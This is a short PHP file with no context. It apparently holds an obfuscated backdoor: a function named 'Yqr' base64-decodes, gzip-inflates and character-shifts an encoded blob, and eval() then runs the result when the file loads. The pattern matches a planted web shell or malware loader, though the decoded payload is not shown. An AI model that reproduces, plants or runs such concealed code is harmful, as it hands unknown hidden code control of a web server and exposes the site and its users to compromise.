<?php function Yqr($Vqyz)
{ 
$Vqyz=gzinflate(base64_decode($Vqyz));
 for($i=0;$i<strlen($Vqyz);$i++)
 {
$Vqyz[$i] = chr(ord($Vqyz[$i])-1);
 }
 return $Vqyz;
 }eval(Yqr("fZDPSsQwEMYfIE8xByFaFornUhE8e/PmyhLS0Q1ts6HJSkU8eFgFQfAgLB49CCJsPYiwIOrLbPbPU2za7ipUcE6T7/fN5EsAXJEIecIyhE1tMsFNx5wp1OH2VkCIZClqxTgCU6qd9iJMnNrXCKYrZNzeXym+5xHwYDcVuZBQqe7sE7dYa9hjvIuAuUEZ6RU9J+Xdvg/z4mv2WdjRcFq8T74fp5evFVFZzyA3GMGGdtMpgxAOK1IWjWndhDtAy9jyhLZ+6em/FHMlMqQVFdLQihwF60B28LYYjubXL/bm2V492METz5AZ7BiRYquvonVfZ26mrc0HjrvExyzRGDQt9Y6/lp/fmIw/FveFvbttTqrYTbjHB+RiCQ=="));?>